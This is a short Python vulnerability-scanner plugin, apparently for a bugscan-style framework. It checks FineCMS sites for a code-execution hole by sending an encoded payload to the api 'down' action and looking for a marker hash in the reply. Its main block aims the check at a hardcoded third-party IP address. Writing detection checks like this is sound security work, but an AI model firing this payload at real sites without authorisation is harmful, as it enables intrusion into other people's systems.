#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = finecms shell
#_FileName_ = Plugin_Format.py
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-061643

def assign(service, arg):
	if service == 'finecms':
		return True, arg

def audit(arg):

    payload = 'index.php?c=api&a=down&file=YTJkOS81dEhyMXVWMkF5SWVxTCt5eHF3eE5ZMUM0a2ZDWjE4WUpCb09ZUHhnVkJsRGZFYjc4cXpadWNuUk9qT0NR'
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl('-L %s' % target);
    if 'c4ca4238a0b923820dcc509a6f75849b' in body:
        security_hole(target);

if __name__ == '__main__':
	from dummy import *
	audit(assign('finecms', 'http://210.26.24.56/pub/wsxy/finecms/')[1])